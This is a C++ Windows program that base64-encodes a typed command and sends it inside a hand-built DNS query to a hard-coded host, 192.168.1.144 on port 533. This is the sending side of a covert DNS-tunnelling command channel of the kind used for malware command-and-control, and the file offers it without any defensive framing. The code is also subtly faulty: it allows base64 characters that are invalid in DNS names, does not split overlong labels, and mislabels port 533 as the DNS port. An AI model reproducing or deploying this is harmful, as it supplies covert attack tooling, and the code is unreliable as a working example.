#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <vector>
#include <string>
#include <cstring>
#include <random>
#include <algorithm>
#include <bitset>

#pragma comment(lib, "ws2_32.lib")

// Structure for the DNS header
#pragma pack(push, 1)
struct DNSHeader {
    uint16_t id;
    uint16_t flags;
    uint16_t q_count;
    uint16_t ans_count;
    uint16_t auth_count;
    uint16_t add_count;
};
#pragma pack(pop)

const std::string BASE64_CHARS =
"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
"abcdefghijklmnopqrstuvwxyz"
"0123456789+/";

std::string base64_encode(const std::string& input) {
    std::string encoded;
    int i = 0, j = 0;
    unsigned char char_array_3[3], char_array_4[4];

    for (auto& c : input) {
        char_array_3[i++] = c;
        if (i == 3) {
            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
            char_array_4[3] = char_array_3[2] & 0x3f;

            for (i = 0; i < 4; i++)
                encoded += BASE64_CHARS[char_array_4[i]];
            i = 0;
        }
    }

    if (i) {
        for (j = i; j < 3; j++)
            char_array_3[j] = '\0';

        char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
        char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
        char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);

        for (j = 0; j < i + 1; j++)
            encoded += BASE64_CHARS[char_array_4[j]];

        while (i++ < 3)
            encoded += '=';
    }

    return encoded;
}

std::string generate_random_string(int length) {
    const std::string chars = "abcdefghijklmnopqrstuvwxyz0123456789";
    std::random_device rd;
    std::mt19937 generator(rd());
    std::uniform_int_distribution<> dist(0, chars.size() - 1);

    std::string random_str;
    for (int i = 0; i < length; ++i) {
        random_str += chars[dist(generator)];
    }
    return random_str;
}

// Function to encode a domain name in DNS format
std::vector<uint8_t> encode_dns_name(const std::string& domain) {
    std::vector<uint8_t> encoded;
    size_t start = 0, end;

    while ((end = domain.find('.', start)) != std::string::npos) {
        encoded.push_back(static_cast<uint8_t>(end - start)); // Length of the part
        encoded.insert(encoded.end(), domain.begin() + start, domain.begin() + end);
        start = end + 1;
    }
    // Last part of the domain
    encoded.push_back(static_cast<uint8_t>(domain.size() - start));
    encoded.insert(encoded.end(), domain.begin() + start, domain.end());

    // Terminator
    encoded.push_back(0);
    return encoded;
}

// Function to send a DNS query
void send_dns_query(const std::string& domain) {
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in server_addr;

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed\n";
        return;
    }

    // Create a UDP socket
    sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock == INVALID_SOCKET) {
        std::cerr << "Socket creation failed\n";
        WSACleanup();
        return;
    }

    // Configure the server address
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(533);  // DNS server port
    server_addr.sin_addr.s_addr = inet_addr("192.168.1.144");  // Server IP

    // Build the DNS packet
    std::vector<uint8_t> dns_packet(sizeof(DNSHeader));
    DNSHeader* dns = reinterpret_cast<DNSHeader*>(&dns_packet[0]);
    dns->id = htons(0x1234);  // Query ID
    dns->flags = htons(0x0100);  // Standard query
    dns->q_count = htons(1);  // 1 question
    dns->ans_count = 0;
    dns->auth_count = 0;
    dns->add_count = 0;

    // Encode the domain name
    std::vector<uint8_t> encoded_name = encode_dns_name(domain);
    dns_packet.insert(dns_packet.end(), encoded_name.begin(), encoded_name.end());

    // Query Type (A) and Class (IN)
    uint16_t qtype = htons(1);  // A (IPv4)
    uint16_t qclass = htons(1); // IN (Internet)
    dns_packet.insert(dns_packet.end(), reinterpret_cast<uint8_t*>(&qtype), reinterpret_cast<uint8_t*>(&qtype) + sizeof(qtype));
    dns_packet.insert(dns_packet.end(), reinterpret_cast<uint8_t*>(&qclass), reinterpret_cast<uint8_t*>(&qclass) + sizeof(qclass));

    // Send the DNS packet
    int send_result = sendto(sock, reinterpret_cast<char*>(dns_packet.data()), dns_packet.size(), 0,
        (struct sockaddr*)&server_addr, sizeof(server_addr));
    if (send_result == SOCKET_ERROR) {
        std::cerr << "Sendto failed\n";
    }
    else {
        std::cout << "[+] Query sent: " << domain << std::endl;
    }

    // Close the socket
    closesocket(sock);
    WSACleanup();
}

int main() {
    std::string command;
    std::cout << "Enter command: ";
    std::getline(std::cin, command);

    // 1. Base64-encode the command (no OpenSSL needed)
    std::string encoded_cmd = base64_encode(command);

    // 2. Generate random subdomains
    std::string random_part1 = generate_random_string(6);
    std::string random_part2 = generate_random_string(8);

    // 3. Construct the final domain: [base64_cmd].[random1].[random2].com
    std::string domain = encoded_cmd + "." + random_part1 + "." + random_part2 + ".com";

    // 4. Send DNS query
    send_dns_query(domain);

    return 0;
}